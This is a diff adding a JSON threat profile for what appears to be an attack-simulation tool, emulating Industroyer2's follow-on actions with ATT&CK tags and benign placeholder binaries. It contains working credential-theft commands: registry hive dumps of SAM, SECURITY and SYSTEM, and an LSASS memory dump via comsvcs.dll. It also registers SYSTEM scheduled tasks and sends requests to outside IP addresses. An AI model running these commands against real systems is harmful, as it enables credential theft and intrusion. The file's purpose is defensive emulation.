@@ -1,0 +1,344 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "This campaign performs many of the reported follow-on actions from Industroyer2 as reported by CERT-UA.",
+        "display_name": "Industroyer2",
+        "name": "Industroyer2",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 35.231.8.202:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "3fd1dca3-7e0f-42cf-8a48-1f5e944868d7",
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://91.245.255.243/index.html -TimeoutSec 15  } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "type": "message"
+            },
+            "5": {
+                "time": "30",
+                "type": "delay"
+            },
+            "6": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://195.230.23.19/index.html -TimeoutSec 15  } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir C:\\",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "9": {
+                "function": "ifelse",
+                "next": "42",
+                "step": "8",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"c:\\perflogs\\pa.pay\" --size 28177 --random",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/Industroyer2/benign.exe --dest \"C:\\perflogs\\vatt.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {(([adsisearcher]'').SearchRoot).Path | %{if(([ADSI]\"s \").gPlink){$a = ((([ADSI]\"S \").gPlink) -replace \"TL; )\" -split \"]\");for ($1=0; $i -lt $a. length; $i++) {if ($a[$i]){Write-Host ( [ADSI] ($a[$i] ).Substring(0, $a[$i].Length - 1)).Path;Write-Host ( [ADSI] ($a[$i]).Substring(0, $a[$i].Length - 1)).DisplayName;Write-Host ([ADSI] ($a[$i]).Substring(0, $a[$i].Length - 1)).flags;}}}} }",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:t1615"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "time": "60",
+                "type": "delay"
+            },
+            "15": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {$time = [DateTime]::Now.AddMinutes(3); $hourMinute=$time.ToString(\"HH:mm\");  $action = New-ScheduledTaskAction -Execute 'c:\\perflogs\\vatt.exe' -Argument 'JRIBDFIMCQAKVBBP pa.pay'; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet; $settings.Hidden = 'False'; $trigger = New-ScheduledTaskTrigger -Once -At $hourMinute; $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings; Register-ScheduledTask -TaskName 'vatt' -InputObject $task -Force }",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "time": "360",
+                "type": "delay"
+            },
+            "17": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--srcVFS://shared/threats/Industroyer2/benign.exe --dest \"c:\\Users\\peremoga.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"C:\\users\\pa1.pay\" --size 41232 --random",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {$time = [DateTime]::Now.AddMinutes(3); $hourMinute=$time.ToString(\"HH:mm\"); $action = New-ScheduledTaskAction -Execute 'c:\\Users\\peremoga.exe' -Argument 'JRIBDFIMCQAKVBBP pa1.pay'; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet; $settings.Hidden = 'True'; $trigger = New-ScheduledTaskTrigger -Once -At $hourMinute; $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings; Register-ScheduledTask -TaskName 'Nezla' -InputObject $task -Force }",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "time": "360",
+                "type": "delay"
+            },
+            "21": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/Industroyer2/benign.exe --dest \"C:\\perflogs\\40 115.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {$time = [DateTime]::Now.AddMinutes(3); $hourMinute=$time.ToString(\"HH:mm\"); $action = New-ScheduledTaskAction -Execute 'c:\\perflogs\\40 115.exe' -Argument '-o \"c:\\perflogs\\40 115.log\"'; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet; $settings.Hidden = 'False'; $trigger = New-ScheduledTaskTrigger -Once -At $hourMinute; $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings; Register-ScheduledTask -TaskName '40115' -InputObject $task -Force }",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "time": "180",
+                "type": "delay"
+            },
+            "24": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"c:\\perflogs\\40 115.log\" --size 18514 --random",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "time": "180",
+                "type": "delay"
+            },
+            "26": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg save HKLM\\SYSTEM C:\\Users\\Public\\sys.reg /y",
+                "rtags": [
+                    "att&ck-technique:T1552.002",
+                    "att&ck-technique:T1012",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1003.002"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "time": "17",
+                "type": "delay"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg save HKLM\\SECURITY C:\\Users\\Public\\sec.reg /y",
+                "rtags": [
+                    "att&ck-technique:T1003.005",
+                    "att&ck-technique:T1003.004",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1552.002",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "time": "9",
+                "type": "delay"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg save HKLM\\SAM C:\\Users\\Public\\sam.reg /y",
+                "rtags": [
+                    "att&ck-technique:T1003.002",
+                    "att&ck-technique:T1552.002",
+                    "att&ck-technique:T1012",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir C:\\dell",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir C:\\tmp",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/Industroyer2/benign.exe --dest \"C:\\dell\\108_100.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"c:\\dell\\108 100.log\" --size 19618 --random",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c C:\\Dell\\108_100.exe -o \"C:\\dell\\108 100.log\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path c:\\dell\\pa1.pay --size 18291 --random",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/Industroyer2/benign.exe --dest \"C:\\dell\\watt.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c C:\\Dell\\watt.exe JRIBDFIMCQAKVBBP c:\\dell\\pa1.pay",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS://shared/threats/Industroyer2/benign.exe --dest \"C:\\tmp\\cdel.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c C:\\tmp\\cdel.exe",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\Users\\Public\\mem.dmp full}",
+                "rtags": [
+                    "att&ck-technique:T1003.001",
+                    "att&ck-technique:T1218.011",
+                    "att&ck-technique:T1057",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
